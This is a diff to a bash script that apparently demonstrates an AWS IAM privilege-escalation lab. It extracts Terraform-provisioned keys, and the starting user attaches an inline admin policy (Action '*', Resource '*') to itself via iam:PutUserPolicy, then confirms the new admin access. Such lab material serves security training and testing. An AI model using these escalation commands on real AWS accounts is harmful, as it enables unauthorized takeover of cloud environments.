@@ -22,12 +22,14 @@ ATTACK_COMMANDS=()
 
 # Display a command before executing it
 show_cmd() {
-    echo -e "${DIM}\$ $*${NC}"
+    local identity="$1"; shift
+    echo -e "${DIM}[${identity}] \$ $*${NC}"
 }
 
 # Display AND record an attack command
 show_attack_cmd() {
-    echo -e "\n${CYAN}\$ $*${NC}"
+    local identity="$1"; shift
+    echo -e "\n${CYAN}[${identity}] \$ $*${NC}"
     ATTACK_COMMANDS+=("$*")
 }
 
@@ -54,21 +56,45 @@ if [ -z "$MODULE_OUTPUT" ]; then
 fi
 
 # Extract credentials
-export AWS_ACCESS_KEY_ID=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_access_key_id')
-export AWS_SECRET_ACCESS_KEY=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_secret_access_key')
+STARTING_ACCESS_KEY_ID=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_access_key_id')
+STARTING_SECRET_ACCESS_KEY=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_secret_access_key')
 
-if [ "$AWS_ACCESS_KEY_ID" == "null" ] || [ -z "$AWS_ACCESS_KEY_ID" ]; then
+if [ "$STARTING_ACCESS_KEY_ID" == "null" ] || [ -z "$STARTING_ACCESS_KEY_ID" ]; then
     echo -e "${RED}Error: Could not extract credentials from terraform output${NC}"
     exit 1
 fi
 
+# Extract readonly credentials for observation/polling steps
+READONLY_ACCESS_KEY=$(terraform output -raw prod_readonly_user_access_key_id 2>/dev/null)
+READONLY_SECRET_KEY=$(terraform output -raw prod_readonly_user_secret_access_key 2>/dev/null)
+
+if [ -z "$READONLY_ACCESS_KEY" ] || [ "$READONLY_ACCESS_KEY" == "null" ]; then
+    echo -e "${RED}Error: Could not find readonly credentials in terraform output${NC}"
+    exit 1
+fi
+
+echo "Access Key ID: ${STARTING_ACCESS_KEY_ID:0:10}..."
+echo "ReadOnly Key ID: ${READONLY_ACCESS_KEY:0:10}..."
 echo -e "${GREEN}✓ Retrieved credentials for $STARTING_USER${NC}\n"
 
 cd - > /dev/null  # Return to scenario directory
 
-# Step 2: Verify identity
+# Credential switching helpers
+use_starting_creds() {
+    export AWS_ACCESS_KEY_ID="$STARTING_ACCESS_KEY_ID"
+    export AWS_SECRET_ACCESS_KEY="$STARTING_SECRET_ACCESS_KEY"
+    unset AWS_SESSION_TOKEN
+}
+use_readonly_creds() {
+    export AWS_ACCESS_KEY_ID="$READONLY_ACCESS_KEY"
+    export AWS_SECRET_ACCESS_KEY="$READONLY_SECRET_KEY"
+    unset AWS_SESSION_TOKEN
+}
+
+# [EXPLOIT] Step 2: Verify identity
+use_starting_creds
 echo -e "${YELLOW}Step 2: Verifying identity${NC}"
-show_cmd "aws sts get-caller-identity --query 'Arn' --output text"
+show_cmd "Attacker" "aws sts get-caller-identity --query 'Arn' --output text"
 CURRENT_IDENTITY=$(aws sts get-caller-identity --query 'Arn' --output text)
 echo "Current identity: $CURRENT_IDENTITY"
 
@@ -78,17 +104,19 @@ if [[ ! $CURRENT_IDENTITY == *"$STARTING_USER"* ]]; then
 fi
 echo -e "${GREEN}✓ Verified identity as $STARTING_USER${NC}\n"
 
-# Step 3: Test current permissions (should be limited)
+# [EXPLOIT] Step 3: Test current permissions (should be limited)
+use_starting_creds
 echo -e "${YELLOW}Step 3: Testing current permissions${NC}"
 echo "Attempting to list IAM users (should fail)..."
-show_cmd "aws iam list-users --max-items 1"
+show_cmd "Attacker" "aws iam list-users --max-items 1"
 if aws iam list-users --max-items 1 2>&1 | grep -q "AccessDenied\|not authorized"; then
     echo -e "${GREEN}✓ Confirmed limited permissions${NC}\n"
 else
     echo -e "${YELLOW}⚠ Warning: Unexpected permissions${NC}\n"
 fi
 
-# Step 4: Perform privilege escalation via PutUserPolicy
+# [EXPLOIT] Step 4: Perform privilege escalation via PutUserPolicy
+use_starting_creds
 echo -e "${YELLOW}Step 4: Escalating privileges via iam:PutUserPolicy${NC}"
 echo "Attaching inline admin policy to self..."
 
@@ -108,7 +136,7 @@ EOF
 )
 
 # Attach the inline policy to self
-show_attack_cmd "aws iam put-user-policy --user-name $STARTING_USER --policy-name $INLINE_POLICY_NAME --policy-document '{\"Version\":\"2012-10-17\",\"Statement\":[{\"Effect\":\"Allow\",\"Action\":\"*\",\"Resource\":\"*\"}]}'"
+show_attack_cmd "Attacker" "aws iam put-user-policy --user-name $STARTING_USER --policy-name $INLINE_POLICY_NAME --policy-document '{\"Version\":\"2012-10-17\",\"Statement\":[{\"Effect\":\"Allow\",\"Action\":\"*\",\"Resource\":\"*\"}]}'"
 aws iam put-user-policy \
     --user-name $STARTING_USER \
     --policy-name $INLINE_POLICY_NAME \
@@ -121,15 +149,16 @@ echo -e "${YELLOW}Waiting 15 seconds for policy changes to propagate...${NC}"
 sleep 15
 echo ""
 
-# Step 5: Verify admin access
+# [OBSERVATION] Step 5: Verify admin access
+use_readonly_creds
 echo -e "${YELLOW}Step 5: Verifying administrator access${NC}"
 echo "Testing admin permissions (listing IAM users)..."
-show_cmd "aws iam list-users --max-items 5 --query 'Users[*].UserName' --output text"
+show_cmd "ReadOnly" "aws iam list-users --max-items 5 --query 'Users[*].UserName' --output text"
 IAM_USERS=$(aws iam list-users --max-items 5 --query 'Users[*].UserName' --output text)
 echo -e "${GREEN}✓ Successfully listed IAM users: $IAM_USERS${NC}"
 
 echo "Testing S3 access..."
-show_cmd "aws s3 ls"
+show_cmd "ReadOnly" "aws s3 ls"
 aws s3 ls | head -5 || echo -e "${YELLOW}(No buckets or still propagating)${NC}"
 
 echo -e "${GREEN}✓ Confirmed administrator access!${NC}\n"
